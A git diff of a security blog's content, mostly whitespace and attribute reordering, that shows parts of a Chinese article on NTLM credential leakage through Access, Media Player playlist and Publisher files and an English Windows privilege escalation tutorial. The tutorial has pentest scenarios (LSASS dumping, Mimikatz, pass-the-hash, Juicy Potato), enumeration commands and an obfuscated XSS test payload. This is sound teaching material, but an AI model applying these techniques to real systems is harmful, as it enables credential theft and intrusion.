+<img alt="Pasted image 20260411064154" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064154.png"/>
 <p><strong>为什么会发生这种情况</strong></p>
 <p>此问题源于对 Microsoft Access 内置功能的利用。攻击者使用<strong>查询对象</strong>结合<strong>AutoExec 宏</strong>进行攻击。AutoExec 宏配置为在打开 Access 文件时<strong>自动对远程表执行查询</strong>。这意味着，无论是否启用了活动内容，应用程序都会在文件打开后立即尝试连接到远程表。</p>
 <p>如果远程表托管在恶意 SMB 服务器上，Microsoft Access 将自动尝试使用 NTLM 进行身份验证，从而导致<strong>NTLM 凭据泄露</strong>。这种情况发生在用户决定是否启用活动内容之前，因此初始警告消息无效。</p>
 <h2>4. Microsoft Media Player：通过旧版播放列表文件泄露 NTLM 身份验证信息</h2>
 <p>想象一下，你收到一封电子邮件，附件中有一个名为<strong>voicemail.wax的</strong>音频快捷方式文件。出于好奇，你想听听里面的内容，于是双击了该文件。仅仅这一次双击，就可能在不知不觉中泄露你的 NTLM 凭据。</p>
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064236.png" alt="Pasted image 20260411064236" />
+<img alt="Pasted image 20260411064236" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064236.png"/>
 <p>通过电子邮件附件接收语音邮件或视频消息很常见，而且这种做法可能已经在实际环境中被用于窃取 NTLM 信息。</p>
 <p><strong>为什么会发生这种情况</strong></p>
 <p><strong>此漏洞利用了Microsoft Windows Media Player</strong>处理某些媒体播放列表文件的方式上的缺陷。攻击者可以构造一封带有附件的恶意电子邮件，该附件使用<strong>.wax、.wvx 或 .wmx</strong> 文件扩展名。当收件人双击该附件时，它会使用默认的媒体播放器应用程序（通常是<strong>wmplayer.exe</strong>）打开。然后，播放列表文件会指示 Windows Media Player 从攻击者控制的 SMB 服务器检索并播放媒体流。</p>
 <p>在此过程中，媒体播放器会无意中将用户的<strong>NT 哈希值</strong>作为身份验证请求的一部分发送到远程服务器，从而导致<strong>NTLM 凭据自动泄露</strong>。此过程完全透明，无需用户进行任何进一步操作。</p>
 <p><strong>“设计缺陷”漏洞</strong></p>
 <p>不出所料，微软将此问题归类为一项功能。其逻辑在于，用户理应谨慎处理媒体文件。然而，更令人惊讶的是<strong>Outlook 安全筛选器</strong>对这些文件的处理方式存在不一致。Outlook 会将<strong>.asx</strong>播放列表文件作为潜在危险附件进行屏蔽，但却不会<strong>屏蔽 .wax、.wvx 或 .wmx</strong>文件——尽管所有这些文件都可能触发相同的行为并泄露 NTLM 凭据。</p>
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064309.png" alt="Pasted image 20260411064309" />
+<img alt="Pasted image 20260411064309" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064309.png"/>
 <h2>5. Microsoft Publisher：通过远程收件人列表泄露 NTLM 身份验证</h2>
 <p>想象一下，你收到一份设计精美的公司节日派对邀请函，它巧妙地伪装成一个名为<strong>Christmas_Party.pub的Publisher 文件</strong>。你好奇地双击该文件查看邀请函。然而，随即出现一个警告提示：<strong>“是否要打开此出版物并访问外部数据？”</strong></p>
 <p>你和你的同事都接受过处理可疑文件的培训，所以你自信地点击了 <strong>“否”</strong> 以为已经避免了任何风险。<strong>不幸的是，你错了——在警告出现之前，你的NTLM凭据就已经泄露了。</strong></p>
@@ -3102,16 +3102,16 @@ Function(atob("YWxlcnQoMSk="))()</code></pre>
     code: "whoami /priv && systeminfo && net localgroup administrators",
     contentHtml: {
       en: String.raw`<h2>Introduction</h2>
-<p>The overall goal of privilege escalation is to elevate our access to a specific system to group members<code>Local Administrators</code>or<code>NT AUTHORITY\SYSTEM</code> Local system account. However, in some cases, elevating other users on the system is enough to achieve our goals. Privilege escalation is often a crucial step in any attack campaign. We need to use gained access, or some data (such as credentials) that can only be found after a session in an elevated context. In some cases, if a client hires us for a "golden image" or "workstation breakout" type of assessment, privilege escalation may be the ultimate goal of the assessment. Privilege escalation is often critical to continuing through the network to achieve our end goal, as well as moving laterally.</p>
+<p>The overall goal of privilege escalation is to elevate our access to a specific system to group members <code>Local Administrators</code> or <code>NT AUTHORITY\SYSTEM</code> Local system account. However, in some cases, elevating other users on the system is enough to achieve our goals. Privilege escalation is often a crucial step in any attack campaign. We need to use gained access, or some data (such as credentials) that can only be found after a session in an elevated context. In some cases, if a client hires us for a "golden image" or "workstation breakout" type of assessment, privilege escalation may be the ultimate goal of the assessment. Privilege escalation is often critical to continuing through the network to achieve our end goal, as well as moving laterally.</p>
 <p>Having said that, we may need to elevate privileges for the following reasons:</p>
 <ol><li>While testing client's Gold Image Windows Workstation and Server builds for flaws</li><li>Elevate privileges locally to gain access to some local resources (such as a database)</li><li>Gain<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">NT AUTHORITY\System</a>level access into the client's Active Directory environment</li><li>Obtain credentials for lateral movement or further privilege escalation inside the client network</li></ol>
-<p>Learn how to perform privilege escalation checks and<code>manually</code>It is also crucial to exploit vulnerabilities as much as possible under certain scenarios. We may run into a situation where a client places us on a hosted workstation that has no internet access, a tight firewall, and the USB ports are disabled so we can't load any tools/auxiliary scripts. In this case, proficiency in Windows privilege escalation checks using PowerShell and the Windows command line is critical.</p>
+<p>Learn how to perform privilege escalation checks and <code>manually</code> It is also crucial to exploit vulnerabilities as much as possible under certain scenarios. We may run into a situation where a client places us on a hosted workstation that has no internet access, a tight firewall, and the USB ports are disabled so we can't load any tools/auxiliary scripts. In this case, proficiency in Windows privilege escalation checks using PowerShell and the Windows command line is critical.</p>
 <p>The system has a huge attack surface. We can elevate privileges in the following ways:</p>
 <ul><li>Abuse of Windows group permissions</li><li>Abuse of Windows user rights</li><li>Bypass User Account Control</li><li>Abuse of weak service/file permissions</li><li>Exploiting bit-patched kernel vulnerabilities</li><li>Credential theft</li><li>traffic capture</li></ul>
-<p><strong>Scenario 1 - Overcoming network limitations</strong> I was once tasked with elevating privileges on a client-provided system that had no network connectivity and the USB port was blocked. Due to network access control, I cannot plug the attacker machine directly into the user's network to assist me. During the assessment, I have discovered a network vulnerability where the printer VLAN is configured to allow outbound communication over ports 80, 443, and 445. I found a permission related vulnerability using a manual enumeration method that allowed me to escalate privileges and execute it manually<code>LSASS</code>Memory dump of the process. I was then able to mount the SMB share hosted on the attacker machine on the printer VLAN and extract<code>LSASS</code>DMP files. With this file I use<code>Mimikatz</code>The domain administrator's NTLM password hash was retrieved offline and I was able to crack the hash offline and use that hash to access the domain controller from the system provided by the client.</p>
-<p><strong>Scenario 2 - Looting public shares</strong> In another assessment, I found myself in a fairly closed environment that was well monitored without any obvious configuration flaws or vulnerable services/applications in use. I found a file share that was completely open, allowing all users to list its contents and download files stored on it. This share hosts backups of the virtual machines in the environment. I'm particularly interested in the virtual hard disk files (<code>.VMDK</code>and<code>.VHDX</code>file). I can access this share from a Windows VM by placing<code>.VHDX</code>Mount the virtual hard disk as a local drive and browse the file system. From here, I retrieved<code>SYSTEM</code>、<code>SAM</code>and registry hives, moved them into my Linux attack box and used<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" rel="noreferrer" target="_blank">secretsdump.py</a><code>SECURITY</code>The tool extracted the local administrator password hash. The organization happened to be using a golden image and was able to gain administrator access to almost any Windows system via a pass-the-hash attack using the local administrator hash.</p>
-<p><strong>Scenario 3 - Obtaining credentials and abusing account privileges</strong> In the final scenario, I was placed in a fairly closed network with the goal of accessing a critical database server. The client provided me with a laptop with a standard domain user account on which I could load tools. Finally, I ran<a href="https://github.com/SnaffCon/Snaffler" rel="noreferrer" target="_blank">Snaffler</a>Tools to search file shares for sensitive information. i found some<code>.sql</code>The file contained low-privilege database credentials pointing to a database on one of their database servers. I use a local MSSQL client, connect to the database via database credentials, enable<a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noreferrer" target="_blank">xp_cmdshell</a>Store the procedure and obtain local command execution permissions. With this service account access, I confirm that I have<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a>permissions, which can be used for local privilege escalation. I downloaded a custom compiled version<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a>Go to the host to assist with privilege escalation and successfully add the local administrator user. Adding the user doesn't work well, but my attempts to get the beacon/reverse shell failed. This access gave me remote access to the database host and full control of the database for one of the company's customers.</p>
-<p><strong>Connect via FreeRDP</strong> We can connect via the command line using the command<code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code>and enter the provided password at the prompt. Most sections provide user credentials<code>htb-student</code>, but some sections (depending on the content) will require you to use a different user for the RDP connection and provide alternate credentials.</p>
+<p><strong>Scenario 1 - Overcoming network limitations</strong> I was once tasked with elevating privileges on a client-provided system that had no network connectivity and the USB port was blocked. Due to network access control, I cannot plug the attacker machine directly into the user's network to assist me. During the assessment, I have discovered a network vulnerability where the printer VLAN is configured to allow outbound communication over ports 80, 443, and 445. I found a permission related vulnerability using a manual enumeration method that allowed me to escalate privileges and execute it manually <code>LSASS</code> Memory dump of the process. I was then able to mount the SMB share hosted on the attacker machine on the printer VLAN and extract <code>LSASS</code> DMP files. With this file I use <code>Mimikatz</code> The domain administrator's NTLM password hash was retrieved offline and I was able to crack the hash offline and use that hash to access the domain controller from the system provided by the client.</p>
+<p><strong>Scenario 2 - Looting public shares</strong> In another assessment, I found myself in a fairly closed environment that was well monitored without any obvious configuration flaws or vulnerable services/applications in use. I found a file share that was completely open, allowing all users to list its contents and download files stored on it. This share hosts backups of the virtual machines in the environment. I'm particularly interested in the virtual hard disk files (<code>.VMDK</code> and <code>.VHDX</code> file). I can access this share from a Windows VM by placing <code>.VHDX</code> Mount the virtual hard disk as a local drive and browse the file system. From here, I retrieved <code>SYSTEM</code>、<code>SAM</code> and registry hives, moved them into my Linux attack box and used<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" rel="noreferrer" target="_blank">secretsdump.py</a><code>SECURITY</code> The tool extracted the local administrator password hash. The organization happened to be using a golden image and was able to gain administrator access to almost any Windows system via a pass-the-hash attack using the local administrator hash.</p>
+<p><strong>Scenario 3 - Obtaining credentials and abusing account privileges</strong> In the final scenario, I was placed in a fairly closed network with the goal of accessing a critical database server. The client provided me with a laptop with a standard domain user account on which I could load tools. Finally, I ran<a href="https://github.com/SnaffCon/Snaffler" rel="noreferrer" target="_blank">Snaffler</a>Tools to search file shares for sensitive information. i found some <code>.sql</code> The file contained low-privilege database credentials pointing to a database on one of their database servers. I use a local MSSQL client, connect to the database via database credentials, enable<a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noreferrer" target="_blank">xp_cmdshell</a>Store the procedure and obtain local command execution permissions. With this service account access, I confirm that I have<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege" rel="noreferrer" target="_blank">SeImpersonatePrivilege</a>permissions, which can be used for local privilege escalation. I downloaded a custom compiled version<a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a>Go to the host to assist with privilege escalation and successfully add the local administrator user. Adding the user doesn't work well, but my attempts to get the beacon/reverse shell failed. This access gave me remote access to the database host and full control of the database for one of the company's customers.</p>
+<p><strong>Connect via FreeRDP</strong> We can connect via the command line using the command <code>xfreerdp /v:&lt;target ip&gt; /u:htb-student</code> and enter the provided password at the prompt. Most sections provide user credentials <code>htb-student</code>, but some sections (depending on the content) will require you to use a different user for the RDP connection and provide alternate credentials.</p>
 <pre><code class="language-shell-session">Chenduoduo@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student
 
 [21:17:27:323] [28158:28159] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
@@ -3144,9 +3144,9 @@ the CA certificate in your certificate store, or the certificate has expired.
 Please look at the OpenSSL documentation on how to add a private CA to the store.
 Do you trust the above certificate? (Y/T/N) y
 Password: </code></pre>
-<p>Many parts of the module require tooling such as open source scripts, precompiled binaries, and exploit PoCs. If applicable, these tools can be found in<code>C:\Tools</code>directory on the target host. Although most of the tools are provided, you can also challenge yourself and try to upload a file to the target host (using the techniques demonstrated in the file transfer module), or even use<a href="https://visualstudio.microsoft.com/downloads/" rel="noreferrer" target="_blank">Visual Studio</a>Compile some tools yourself.</p>
+<p>Many parts of the module require tooling such as open source scripts, precompiled binaries, and exploit PoCs. If applicable, these tools can be found in <code>C:\Tools</code> directory on the target host. Although most of the tools are provided, you can also challenge yourself and try to upload a file to the target host (using the techniques demonstrated in the file transfer module), or even use<a href="https://visualstudio.microsoft.com/downloads/" rel="noreferrer" target="_blank">Visual Studio</a>Compile some tools yourself.</p>
 <p><strong>Useful Tools</strong></p>
-<div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt" rel="noreferrer" target="_blank">Seatbelt</a></td><td>C# project for performing various local privilege escalation checks</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" rel="noreferrer" target="_blank">winPEAS</a></td><td>is a script that searches a Windows host for possible privilege escalation paths. Instructions for all inspections are as follows:</td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" rel="noreferrer" target="_blank">PowerUp</a></td><td>PowerShell script to find common Windows privilege escalation vectors that rely on misconfiguration. It can also be used to exploit problems that have been discovered.</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp" rel="noreferrer" target="_blank">SharpUp</a></td><td>C# version of PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS" rel="noreferrer" target="_blank">JAWS</a></td><td>PowerShell script written in PowerShell 2.0 to enumerate privilege escalation vectors</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a></td><td>is a PowerShell tool that finds and decrypts session information saved by remote access tools. It can extract session information saved by PuTTY, WinSCP, SuperPuTTY, FileZilla and RDP.</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson" rel="noreferrer" target="_blank">Watson</a></td><td>is a. NET tool designed to enumerate missing KBs and suggest exploits of privilege escalation vulnerabilities.</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a></td><td>Tool for retrieving passwords stored on your local computer from web browsers, chat tools, databases, Git, email, memory dumps, PHP, system administration tools, wireless network configurations, internal Windows password storage mechanisms, and more</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng" rel="noreferrer" target="_blank">Windows Exploit Suggester - Next Generation</a></td><td>is a tool based on the output of a Windows utility<code>systeminfo</code>, which provides a list of vulnerabilities to which the operating system is vulnerable, along with any exploits for those vulnerabilities. It supports all Windows operating systems from Windows XP to Windows 10, including their corresponding Windows Server versions.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" rel="noreferrer" target="_blank">Sysinternals Suite</a></td><td>We'll use several tools from Sysinternals in our enumerations, including<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist" rel="noreferrer" target="_blank">PipeList</a>and<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a></td></tr></tbody></table></div>
+<div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt" rel="noreferrer" target="_blank">Seatbelt</a></td><td>C# project for performing various local privilege escalation checks</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" rel="noreferrer" target="_blank">winPEAS</a></td><td>is a script that searches a Windows host for possible privilege escalation paths. Instructions for all inspections are as follows:</td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" rel="noreferrer" target="_blank">PowerUp</a></td><td>PowerShell script to find common Windows privilege escalation vectors that rely on misconfiguration. It can also be used to exploit problems that have been discovered.</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp" rel="noreferrer" target="_blank">SharpUp</a></td><td>C# version of PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS" rel="noreferrer" target="_blank">JAWS</a></td><td>PowerShell script written in PowerShell 2.0 to enumerate privilege escalation vectors</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a></td><td>is a PowerShell tool that finds and decrypts session information saved by remote access tools. It can extract session information saved by PuTTY, WinSCP, SuperPuTTY, FileZilla and RDP.</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson" rel="noreferrer" target="_blank">Watson</a></td><td>is a. NET tool designed to enumerate missing KBs and suggest exploits of privilege escalation vulnerabilities.</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a></td><td>Tool for retrieving passwords stored on your local computer from web browsers, chat tools, databases, Git, email, memory dumps, PHP, system administration tools, wireless network configurations, internal Windows password storage mechanisms, and more</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng" rel="noreferrer" target="_blank">Windows Exploit Suggester - Next Generation</a></td><td>is a tool based on the output of a Windows utility <code>systeminfo</code>, which provides a list of vulnerabilities to which the operating system is vulnerable, along with any exploits for those vulnerabilities. It supports all Windows operating systems from Windows XP to Windows 10, including their corresponding Windows Server versions.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" rel="noreferrer" target="_blank">Sysinternals Suite</a></td><td>We'll use several tools from Sysinternals in our enumerations, including<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist" rel="noreferrer" target="_blank">PipeList</a>and<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a></td></tr></tbody></table></div>
 <h2>Situational awareness and environmental mapping</h2>
 <h3>situational awareness</h3>
 <p>No matter what situation you are in, whether it is in daily life or in a project such as network penetration testing, it is crucial to always grasp your position in time and space.</p>
@@ -3161,7 +3161,7 @@ Password: </code></pre>
 <pre><code class="language-cmd-session">C:\htb&gt; route print</code></pre>
 <p>Enumerating existing protections will help us ensure that the methods used are not blocked or detected, and will also help us if we have to write a custom payload or modify it before compiling the tool.</p>
 <ol><li><strong>Enumeration protection measures</strong></li></ol>
-<p>Many organizations use some kind of application whitelisting solution to control which types of applications and files certain users can run. This may be used to try to prevent non-admin users from running<code>cmd.exe</code>its<code>PowerShell.exe</code>Other binaries and file types not required for daily work. A common solution provided by Microsoft is<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview" rel="noreferrer" target="_blank">AppLocker</a>. we can use<a href="https://docs.microsoft.com/en-us/PowerShell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps" rel="noreferrer" target="_blank">GetAppLockerPolicy</a> The cmdlet enumerates local, effective (enforcement), and domain AppLocker policies. This will help us understand which binaries or file types may be blocked and whether we need to perform some kind of AppLocker bypass during the enumeration process or before running a tool or technique to escalate privileges.</p>
+<p>Many organizations use some kind of application whitelisting solution to control which types of applications and files certain users can run. This may be used to try to prevent non-admin users from running <code>cmd.exe</code> its <code>PowerShell.exe</code> Other binaries and file types not required for daily work. A common solution provided by Microsoft is<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview" rel="noreferrer" target="_blank">AppLocker</a>. we can use<a href="https://docs.microsoft.com/en-us/PowerShell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps" rel="noreferrer" target="_blank">GetAppLockerPolicy</a> The cmdlet enumerates local, effective (enforcement), and domain AppLocker policies. This will help us understand which binaries or file types may be blocked and whether we need to perform some kind of AppLocker bypass during the enumeration process or before running a tool or technique to escalate privileges.</p>
 <ul><li>Check Windows Defender status</li></ul>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-MpComputerStatus
 
@@ -3315,9 +3315,9 @@ PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows
 </code></pre>
 <h3>initial enumeration</h3>
 <p>During the evaluation, we may obtain a low-privilege shell on the Windows host (whether domain-joined or not) that requires privilege escalation for further access. Fully compromising the host could potentially give us access to sensitive files/file shares, gain the ability to capture traffic to obtain more credentials, or gain credentials that can help further escalate access, or even directly escalate to Domain Administrator privileges in an Active Directory environment. Depending on the system configuration and the type of data encountered, we can escalate privileges to one of the following:</p>
-<ul><li>highly privileged<code>NT AUTHORITY\SYSTEM</code> account, or<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">LocalSystem</a> account, which is a highly privileged account that has more permissions than the local administrator account and is used to run most Windows services.</li><li>built-in local<code>administrator</code>account. Some organizations disable the account, but many do not. In a client environment, it is not uncommon for this account to be reused across multiple systems.</li><li>Another local account, which is local<code>administrator</code>members of the group. Any account in this group will have the same<code>administrator</code>Account has the same permissions.</li><li>A standard (non-privileged) domain user, belonging to the local<code>administrator</code>group.</li><li>A domain administrator (highly privileged in an Active Directory environment), belonging to the local<code>Administrators group</code>.</li></ul>
+<ul><li>highly privileged <code>NT AUTHORITY\SYSTEM</code> account, or<a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">LocalSystem</a> account, which is a highly privileged account that has more permissions than the local administrator account and is used to run most Windows services.</li><li>built-in local <code>administrator</code> account. Some organizations disable the account, but many do not. In a client environment, it is not uncommon for this account to be reused across multiple systems.</li><li>Another local account, which is local <code>administrator</code> members of the group. Any account in this group will have the same <code>administrator</code> Account has the same permissions.</li><li>A standard (non-privileged) domain user, belonging to the local <code>administrator</code> group.</li><li>A domain administrator (highly privileged in an Active Directory environment), belonging to the local <code>Administrators group</code>.</li></ul>
 <p><strong>key data points</strong></p>
-<ul><li><code>OS name</code> <code>system name</code>: Knowing the type (workstation or server) and level of Windows operating system (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) can give us an idea of the types of tools that may be available in legacy systems (e.g.<code>PowerShell</code> version), or if these tools are lacking. This also identifies operating system versions where public exploits may exist.</li><li><code>Version</code>: Similar to operating system versions, there may be public exploits for specific Windows version vulnerabilities. Windows system vulnerabilities can cause system instability or even complete system crashes. Be careful when running these programs on any production system and make sure you fully understand the vulnerability and its possible consequences before running it.</li><li><code>Running Services</code> <code>running services</code>: It is important to understand the services running on the host, especially those that start with<code>NT AUTHORITY\SYSTEM</code> Or a service run by an administrator-level account. A misconfigured or vulnerable service running in a privileged account is often an easy advantage for privilege escalation.</li></ul>
+<ul><li><code>OS name</code> <code>system name</code>: Knowing the type (workstation or server) and level of Windows operating system (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) can give us an idea of the types of tools that may be available in legacy systems (e.g.<code>PowerShell</code> version), or if these tools are lacking. This also identifies operating system versions where public exploits may exist.</li><li><code>Version</code>: Similar to operating system versions, there may be public exploits for specific Windows version vulnerabilities. Windows system vulnerabilities can cause system instability or even complete system crashes. Be careful when running these programs on any production system and make sure you fully understand the vulnerability and its possible consequences before running it.</li><li><code>Running Services</code> <code>running services</code>: It is important to understand the services running on the host, especially those that start with <code>NT AUTHORITY\SYSTEM</code> Or a service run by an administrator-level account. A misconfigured or vulnerable service running in a privileged account is often an easy advantage for privilege escalation.</li></ul>
 <h4>System information</h4>
 <p>Looking at the system itself can give us a better idea of the specific operating system version, hardware used, installed programs and security updates. This will help us narrow down the search for missing patches and related CVEs in order to escalate privileges. Use<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist" rel="noreferrer" target="_blank">Tasklist</a>Command to view running processes can give us a better understanding of the applications currently running on the system.</p>
 <pre><code class="language-cmd">Tasklist</code></pre>
@@ -3369,10 +3369,10 @@ TrustedInstaller.exe          1120 TrustedInstaller
 TiWorker.exe                  1816 N/A
 WmiApSrv.exe                  2428 wmiApSrv
 tasklist.exe                  3596 N/A</code></pre>
-<p>Familiarity with standard Windows processes such as the Session Manager Subsystem (smss.exe), Client Server Runtime Subsystem (csrss.exe),<a href="https://en.wikipedia.org/wiki/Winlogon" rel="noreferrer" target="_blank">WinLogon (winlogon.exe)、</a> Local Security Authority Subsystem Service (LSASS) and Service Host (svchost.exe), among others, and their related services, are critical. Being able to quickly identify standard processes/services will help speed up our enumeration and allow us to focus on non-standard processes/services, potentially opening a path to privilege escalation. In the above example, we are most interested in<code>FileZilla</code> FTP server operation and try to enumerate versions to find open vulnerabilities or misconfigurations, such as FTP anonymous access, that could lead to exposure of sensitive data and more.</p>
-<p>Other processes, such as<code>MsMpEng.exe</code>, Windows Defender, are also interesting because they help us plan the protection measures that may need to be circumvented or bypassed on the target host.</p>
-<p><strong>Show all environment variables</strong> Environment variables explain a lot about host configuration. To print them, Windows provides<code>set</code> command.<code>PATH</code> is one of the most commonly overlooked variables. In the output below, there are no exceptions. However, the administrator (or application) modifies<code>PATH</code> The situation is not uncommon. A common example is to put Python or Java in the path so that Python or. JAR files. DLL injection into other applications may be possible if the folders placed in the PATH are user-writable. Remember, when you run a program, Windows first looks for the program in CWD (the current working directory) and then in PATH from left to right. This means that if a custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right.</p>
-<p>In addition to PATH,<code>set</code>Other useful information can also be provided, such as HOME DRIVE. In an enterprise, this is usually file sharing. Going directly to the file sharing page may display other accessible directories. It is not uncommon to have access to the "IT Catalog" which contains inventory tables containing passwords. Additionally, sharing is used for home directories so users can log into other computers and have the same experience/files/desktop, etc. (Roaming Profiles). It could also mean the user is carrying something malicious. If the file is placed in<code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code>, this file will be executed when the user logs into another machine.</p>
+<p>Familiarity with standard Windows processes such as the Session Manager Subsystem (smss.exe), Client Server Runtime Subsystem (csrss.exe),<a href="https://en.wikipedia.org/wiki/Winlogon" rel="noreferrer" target="_blank">WinLogon (winlogon.exe)、</a> Local Security Authority Subsystem Service (LSASS) and Service Host (svchost.exe), among others, and their related services, are critical. Being able to quickly identify standard processes/services will help speed up our enumeration and allow us to focus on non-standard processes/services, potentially opening a path to privilege escalation. In the above example, we are most interested in <code>FileZilla</code> FTP server operation and try to enumerate versions to find open vulnerabilities or misconfigurations, such as FTP anonymous access, that could lead to exposure of sensitive data and more.</p>
+<p>Other processes, such as <code>MsMpEng.exe</code>, Windows Defender, are also interesting because they help us plan the protection measures that may need to be circumvented or bypassed on the target host.</p>
+<p><strong>Show all environment variables</strong> Environment variables explain a lot about host configuration. To print them, Windows provides <code>set</code> command.<code>PATH</code> is one of the most commonly overlooked variables. In the output below, there are no exceptions. However, the administrator (or application) modifies <code>PATH</code> The situation is not uncommon. A common example is to put Python or Java in the path so that Python or. JAR files. DLL injection into other applications may be possible if the folders placed in the PATH are user-writable. Remember, when you run a program, Windows first looks for the program in CWD (the current working directory) and then in PATH from left to right. This means that if a custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right.</p>
+<p>In addition to PATH,<code>set</code> Other useful information can also be provided, such as HOME DRIVE. In an enterprise, this is usually file sharing. Going directly to the file sharing page may display other accessible directories. It is not uncommon to have access to the "IT Catalog" which contains inventory tables containing passwords. Additionally, sharing is used for home directories so users can log into other computers and have the same experience/files/desktop, etc. (Roaming Profiles). It could also mean the user is carrying something malicious. If the file is placed in <code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code>, this file will be executed when the user logs into another machine.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; set
 
 ALLUSERSPROFILE=C:\ProgramData
@@ -3411,7 +3411,7 @@ USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
 USERNAME=Administrator
 USERPROFILE=C:\Users\Administrator
 windir=C:\Windows </code></pre>
-<p><strong>View detailed configuration information</strong> <code>systeminfo</code> The command will show whether the device has been recently patched and whether it is a virtual machine. If the device has not been patched recently, gaining administrator-level access may be as simple as running a known exploit. Google the knowledge base installed under Hotfix to know when the box has been patched. This information is not always present because hotfix software can be hidden from non-administrators. You can also view<code>system boot time</code>and<code>operating system version</code>, to understand the patch level. If the box hasn't been rebooted in more than six months, it probably hasn't been patched either.</p>
+<p><strong>View detailed configuration information</strong> <code>systeminfo</code> The command will show whether the device has been recently patched and whether it is a virtual machine. If the device has not been patched recently, gaining administrator-level access may be as simple as running a known exploit. Google the knowledge base installed under Hotfix to know when the box has been patched. This information is not always present because hotfix software can be hidden from non-administrators. You can also view <code>system boot time</code> and <code>operating system version</code>, to understand the patch level. If the box hasn't been rebooted in more than six months, it probably hasn't been patched either.</p>
 <p>Additionally, many guides will say that network information is important because it may indicate that the machine is dual-homed (connected to multiple networks). Typically for enterprises, devices are given access to other networks through firewall rules, without a physical cable connection.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; systeminfo
 
@@ -3468,7 +3468,7 @@ Network Card(s):           2 NIC(s) Installed.
                                  [01]: 192.168.20.56
                                  [02]: fe80::f055:fefd:b1b:9919
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre>
